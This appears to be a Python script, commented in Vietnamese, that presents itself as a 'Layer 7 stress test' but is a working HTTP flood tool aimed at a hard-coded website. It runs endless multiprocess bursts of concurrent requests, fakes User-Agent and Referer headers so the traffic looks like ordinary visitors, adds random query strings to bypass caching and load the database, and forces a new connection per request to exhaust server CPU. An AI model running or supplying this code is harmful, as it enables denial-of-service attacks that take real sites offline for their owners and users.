import asyncio
import aiohttp
import random
import multiprocessing
import sys
import string

# ==============================================================================
# HỆ THỐNG DEMO TRAFFIC CỰC HẠN (CHAOS MODE v3)
# Chế độ: High-Intensity Layer 7 Stress Test
# Mục đích: Kiểm tra khả năng chống chịu của CPU & RAM Server
# ==============================================================================

# Danh sách Referer giả lập để trông như traffic đến từ nhiều nguồn
REFERERS = [
    "https://www.google.com/", "https://www.facebook.com/",
    "https://twitter.com/", "https://www.bing.com/",
    "https://duckduckgo.com/", "https://fixnhanh.com/"
]

def get_random_string(length=10):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

async def chaos_worker(process_id, url, concurrency):
    """Gửi traffic hỗn loạn với tốc độ tối đa."""
    print(f"[Process {process_id}] Đang triển khai Chaos Mode...")
    
    # Ép server đóng kết nối ngay sau khi gửi (Connection: close) 
    # Điều này khiến server cực kỳ tốn CPU để xử lý SSL/Handshake mới liên tục
    headers_base = {
        'Connection': 'close',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'DNT': '1',
        'Upgrade-Insecure-Requests': '1'
    }

    # Cấu hình không giới hạn số lượng kết nối trong session
    connector = aiohttp.TCPConnector(limit=0, ssl=False, ttl_dns_cache=300)
    
    async with aiohttp.ClientSession(connector=connector) as session:
        while True:
            tasks = []
            for _ in range(concurrency):
                # Tạo Header ngẫu nhiên cho mỗi request
                current_headers = headers_base.copy()
                current_headers['User-Agent'] = f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) {get_random_string(5)}"
                current_headers['Referer'] = random.choice(REFERERS)
                
                # Kỹ thuật Chaos: Bắn vào các URL tìm kiếm ngẫu nhiên để BYPASS CACHE hoàn toàn
                # Server sẽ buộc phải xử lý Database thay vì trả về trang tĩnh
                chaos_url = f"{url}?s={get_random_string(15)}&t={random.random()}"
                
                tasks.append(session.get(chaos_url, headers=current_headers, timeout=5))
            
            # Gửi đồng loạt và KHÔNG chờ kết quả
            await asyncio.gather(*tasks, return_exceptions=True)
            
            if process_id == 0:
                sys.stdout.write(f"\r[🔥] Đang bắn phá với CHAOS MODE (RPS cực cao)... ")
                sys.stdout.flush()

def start_process(process_id, url, concurrency):
    try:
        asyncio.run(chaos_worker(process_id, url, concurrency))
    except KeyboardInterrupt:
        pass

if __name__ == "__main__":
    # --- CẤU HÌNH ---
    TARGET_URL = "http://fixcham.cloud" # <--- ĐÃ CẬP NHẬT WEB CỦA BẠN
    CONCURRENCY_PER_CORE = 150          # Tăng số luồng lên 150 mỗi nhân
    CORES = multiprocessing.cpu_count()
    
    if "your-website.com" in TARGET_URL:
        print("VUI LÒNG SỬA URL TRONG CODE!")
        sys.exit()

    print(f"!!! KHỞI CHẠY CHAOS MODE v3 (GOD MODE) !!!")
    print(f"Mục tiêu: {TARGET_URL}")
    print(f"Sử dụng {CORES} nhân CPU để tạo áp lực tối đa.")
    print(f"Bypass Cache: ĐÃ BẬT | SSL Handshake Tax: ĐÃ BẬT")
    print(f"Nhấn Ctrl+C để dừng.")
    
    processes = []
    for i in range(CORES):
        p = multiprocessing.Process(target=start_process, args=(i, TARGET_URL, CONCURRENCY_PER_CORE))
        p.start()
        processes.append(p)

    try:
        for p in processes:
            p.join()
    except KeyboardInterrupt:
        print("\n[!] Đang dừng hệ thống...")
        for p in processes:
            p.terminate()
